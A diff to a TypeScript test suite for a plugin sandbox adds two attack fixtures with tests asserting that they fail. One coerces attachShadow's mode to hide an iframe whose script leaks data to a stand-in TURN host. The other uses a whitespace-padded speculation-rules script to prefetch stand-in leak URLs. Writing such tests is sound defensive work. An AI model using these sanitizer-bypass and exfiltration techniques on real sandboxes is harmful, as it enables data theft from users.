@@ -843,6 +843,141 @@ const SANITIZER_SHADOW_ATTACK_HTML = `<!doctype html>
  * lives in `bridge.ts`: the element must not survive to the live document, from
  * markup or from script. It does today, `src` and `partition` intact.
  */
+/**
+ * Round 14. The `attachShadow` wrapper only forces `mode: "open"` when it reads
+ * back the *primitive* string `"open"` or `"closed"`; anything else is "the
+ * platform's to reject" and is forwarded untouched. `mode` is an enum, so the
+ * platform converts it with `ToString` — `new String("closed")` (or any object
+ * with a `toString`) is not `=== "closed"` for the wrapper and is a perfectly
+ * valid `"closed"` for the platform.
+ *
+ * The wrapper's own verification then fires (`element.shadowRoot` is `null` for
+ * a closed root, so it drops the host and throws) — but the root already exists,
+ * and it was made by `attachShadow`, which sets "available to element internals".
+ * `attachInternals().shadowRoot` hands it straight back. Re-append the host and
+ * a frame inside that root is invisible to everything: the observer on
+ * `document` is not told about mutations inside a shadow tree, `querySelectorAll`
+ * does not cross the boundary, and `follow()` reads `null`.
+ */
+const SHADOW_MODE_COERCION_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script>
+      var RAW_CHILD = "<script>var ice='no';try{var pc=new RTCPeerConnection(" +
+        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
+        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
+        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
+        "{exfil:1,type:'child',tag:'TAG',rtc:typeof RTCPeerConnection,ice:ice},'*');<\\/script>";
+
+      try {
+        customElements.define("x-coerce", class extends HTMLElement {});
+        customElements.define("x-coerce2", class extends HTMLElement {});
+      } catch (error) {}
+
+      // Two shapes of a non-primitive \`mode\`: a boxed string and a plain object
+      // with \`toString\`. Both are \`typeof "object"\`, so neither is \`=== "closed"\`.
+      function attempt(tag, name, mode, notes) {
+        var host = document.createElement(name);
+        document.body.appendChild(host);
+        try {
+          host.attachShadow({ mode: mode });
+          notes.push(tag + ":attachShadow=returned");
+        } catch (error) {
+          notes.push(tag + ":attachShadow:threw:" + (error && error.name));
+        }
+        notes.push(tag + ":shadowRoot=" + (host.shadowRoot ? host.shadowRoot.mode : "null"));
+        var root = null;
+        try {
+          root = host.attachInternals().shadowRoot;
+        } catch (error) {
+          notes.push(tag + ":internals:threw:" + (error && error.name));
+        }
+        notes.push(tag + ":internalsRoot=" + (root ? root.mode : "null"));
+        if (!root) return;
+        // The wrapper's fail-closed path removed the host from the document.
+        // Putting it back is one line, and the root comes with it.
+        if (!host.isConnected) document.body.appendChild(host);
+        try {
+          var frame = document.createElement("iframe");
+          frame.srcdoc = RAW_CHILD.replace("TAG", tag);
+          root.appendChild(frame);
+        } catch (error) {
+          notes.push(tag + ":plant:threw:" + (error && error.name));
+        }
+      }
+
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        var notes = [];
+        try {
+          attempt("boxed", "x-coerce", new String("closed"), notes);
+        } catch (error) {
+          notes.push("boxed:threw:" + (error && error.name));
+        }
+        try {
+          attempt("tostring", "x-coerce2", { toString: function () { return "closed"; } }, notes);
+        } catch (error) {
+          notes.push("tostring:threw:" + (error && error.name));
+        }
+
+        setTimeout(function () {
+          window.parent.postMessage(
+            { exfil: 1, type: "swept", note: notes.join(" | ") },
+            "*"
+          );
+        }, 600);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
+/**
+ * Round 14. `<script type="speculationrules">` names URLs the platform fetches
+ * on its own, so both paths drop it — the detached sanitiser by an exact,
+ * trimmed comparison, and the sweep by a CSS attribute selector.
+ *
+ * The platform strips leading and trailing ASCII whitespace off `type` before it
+ * decides, and CSS has no way to do that. `[type="speculationrules" i]` is an
+ * exact match, so a script appended at runtime with a padded `type` is acted on
+ * by the platform and invisible to the sweep. Both orderings are here: markup,
+ * which the trimming sanitiser already handled, and script, which did not.
+ */
+const SPECULATION_RULES_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script type=" speculationrules ">
+      {"prefetch":[{"source":"list","urls":["https://markup.leak.example.test/?d=__exfil__"]}]}
+    </script>
+    <script>
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        try {
+          var rules = document.createElement("script");
+          rules.setAttribute("type", "\\n speculationrules\\t");
+          rules.textContent = JSON.stringify({
+            prefetch: [{ source: "list", urls: ["https://script.leak.example.test/?d=__exfil__"] }]
+          });
+          document.body.appendChild(rules);
+        } catch (error) {}
+
+        setTimeout(function () {
+          var found = [];
+          var all = document.querySelectorAll("script");
+          for (var i = 0; i < all.length; i++) {
+            var type = all[i].getAttribute("type");
+            if (type && type.trim().toLowerCase() === "speculationrules") found.push(type);
+          }
+          window.parent.postMessage({ exfil: 1, type: "rules", found: found }, "*");
+        }, 300);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
 const WEBVIEW_ATTACK_HTML = `<!doctype html>
 <html>
   <body>
@@ -1386,6 +1521,82 @@ describe("a hostile plugin", () => {
     // default config happens to strip the frame today, and that is the
     // sanitiser's policy to change, not ours.
     expect(note).toContain("setHTMLWide:threw:");
+  });
+
+  it("cannot get a closed shadow root by coercing attachShadow's mode", async () => {
+    const childReports: string[] = [];
+    let swept: string | null = null;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as {
+        exfil?: number;
+        type?: string;
+        tag?: string;
+        ice?: string;
+        rtc?: string;
+        note?: string;
+      };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "child") {
+        childReports.push(`${data.tag}=rtc:${data.rtc};ice:${data.ice}`);
+      }
+      if (data.type === "swept") {
+        swept = data.note ?? "";
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(SHADOW_MODE_COERCION_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    const note = await waitFor(() => swept, "the shadow-mode coercion attack to finish");
+
+    // A report from a child realm is the escape.
+    expect(childReports, note).toEqual([]);
+    // And no closed root may exist at all, retrievable or not: `attachShadow`
+    // is the only door left to one, and a closed root that merely fails to be
+    // *retrieved* today is one `ElementInternals` change from the same hole.
+    // Both readings say `open`, which is the wrapper doing its single job.
+    expect(note).toContain("boxed:shadowRoot=open");
+    expect(note).toContain("boxed:internalsRoot=open");
+    expect(note).toContain("tostring:shadowRoot=open");
+    expect(note).toContain("tostring:internalsRoot=open");
+  });
+
+  it("cannot leave a speculation-rules script in the document", async () => {
+    let found: string[] | null = null;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as { exfil?: number; type?: string; found?: string[] };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "rules") {
+        found = data.found ?? [];
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(SPECULATION_RULES_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    // Whitespace-padded on both paths, because that is what the platform trims
+    // and a CSS attribute selector does not.
+    expect(await waitFor(() => found, "the speculation-rules attack to finish")).toEqual([]);
   });
 
   it("cannot get an Electron webview guest into the document", async () => {
